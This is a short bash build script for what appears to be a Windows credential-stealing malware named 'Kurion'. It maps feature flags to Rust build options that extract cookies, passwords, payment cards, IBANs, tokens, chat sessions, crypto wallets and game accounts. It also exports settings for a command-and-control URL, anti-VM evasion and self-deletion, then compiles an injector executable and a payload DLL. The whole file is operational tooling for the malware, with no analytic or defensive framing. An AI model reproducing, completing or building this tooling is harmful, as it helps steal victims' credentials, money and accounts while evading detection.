#!/bin/bash

set -e

FEATURES="${1:-cookies,passwords,cards,ibans,tokens,bookmarks,socials,wallets,games}"
echo "Building with features: $FEATURES"

IFS=',' read -ra FEAT_ARRAY <<< "$FEATURES"
CARGO_FEATURES=""

for feat in "${FEAT_ARRAY[@]}"; do
    feat=$(echo "$feat" | xargs)
    case "$feat" in
        cookies)
            CARGO_FEATURES="$CARGO_FEATURES --features extract_cookies"
            ;;
        passwords)
            CARGO_FEATURES="$CARGO_FEATURES --features extract_passwords"
            ;;
        cards)
            CARGO_FEATURES="$CARGO_FEATURES --features extract_cards"
            ;;
        ibans)
            CARGO_FEATURES="$CARGO_FEATURES --features extract_ibans"
            ;;
        tokens)
            CARGO_FEATURES="$CARGO_FEATURES --features extract_tokens"
            ;;
        bookmarks)
            CARGO_FEATURES="$CARGO_FEATURES --features extract_bookmarks"
            ;;
        socials|discord|telegram)
            CARGO_FEATURES="$CARGO_FEATURES --features extract_socials"
            ;;
        wallets|crypto)
            CARGO_FEATURES="$CARGO_FEATURES --features extract_wallets"
            ;;
        games|steam|epic)
            CARGO_FEATURES="$CARGO_FEATURES --features extract_games"
            ;;
    esac
done

echo "Cargo features: $CARGO_FEATURES"

export KURION_FEATURES="$FEATURES"
export KURION_C2_URL="${KURION_C2_URL:-}"
export KURION_ANTIVM="${KURION_ANTIVM:-false}"
export KURION_SELF_DELETE="${KURION_SELF_DELETE:-false}"
export KURION_DEBUG="${KURION_DEBUG:-false}"

INJECTOR_FEATURES=""
if [ "$KURION_DEBUG" = "true" ]; then
    INJECTOR_FEATURES="--features debug_console"
fi

echo "Building payload..."
cd payload
cargo build --release --target x86_64-pc-windows-gnu --no-default-features $CARGO_FEATURES
cd ..

echo "Building injector..."
cd injector
cargo build --release --target x86_64-pc-windows-gnu $INJECTOR_FEATURES
cd ..

echo "Build complete!"
echo "Injector: target/x86_64-pc-windows-gnu/release/injector.exe"
echo "Payload: target/x86_64-pc-windows-gnu/release/payload.dll"
